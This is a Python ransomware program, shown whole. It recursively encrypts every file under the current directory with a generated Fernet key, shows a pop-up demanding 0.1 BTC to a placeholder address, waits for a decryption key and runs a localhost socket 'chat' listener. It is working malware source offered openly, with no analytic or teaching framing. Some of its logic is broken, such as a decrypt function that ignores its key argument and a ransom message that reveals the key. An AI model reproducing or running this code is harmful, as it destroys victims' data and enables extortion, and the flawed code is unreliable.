import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
import threading
import time
import sys
import base64
import socket

# Server configuration
HOST = 'localhost'
PORT = 8888

# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Function to encrypt a file
def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        plaintext = file.read()
    ciphertext = cipher_suite.encrypt(plaintext)
    with open(file_path, 'wb') as file:
        file.write(ciphertext)

# Function to decrypt a file
def decrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        ciphertext = file.read()
    plaintext = cipher_suite.decrypt(ciphertext)
    with open(file_path, 'wb') as file:
        file.write(plaintext)

# Encrypt files in the current directory
def encrypt_files():
    for root, dirs, files in os.walk('.'):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path)

# Display the ransom message
def display_ransom_message():
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Ransomware", "All your files have been encrypted!\nTo decrypt your files, send me 0.1 BTC to this address: 123456789ABCDEF\nAnd send me the decryption key: " + base64.b64encode(key).decode())
    root.mainloop()

# Function to handle chat communication
def chat_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)

    print(f"[*] Listening on {HOST}:{PORT}")

    while True:
        # Accept client connection
        client_socket, address = server_socket.accept()
        print(f"[*] Accepted connection from {address[0]}:{address[1]}")

        while True:
            # Receive message from the client
            message = client_socket.recv(1024).decode()

            if message.lower() == 'exit':
                break

            print(f"[*] Received message: {message}")
            client_socket.send("Message received".encode())

        client_socket.close()

    server_socket.close()

# Function to check for decryption attempts
def check_decryption():
    while True:
        decryption_key = input("Enter the decryption key: ")
        try:
            decryption_key = base64.b64decode(decryption_key)
            cipher_suite = Fernet(decryption_key)
            for root, dirs, files in os.walk('.'):
                for file in files:
                    file_path = os.path.join(root, file)
                    decrypt_file(file_path, cipher_suite)
            print("Files decrypted successfully.")
            sys.exit()
        except:
            print("Incorrect decryption key. Please try again.")

# Main function
def main():
    encrypt_files()
    display_ransom_message()
    decryption_thread = threading.Thread(target=check_decryption)
    decryption_thread.start()

    chat_thread = threading.Thread(target=chat_server)
    chat_thread.start()

if __name__ == '__main__':
    main()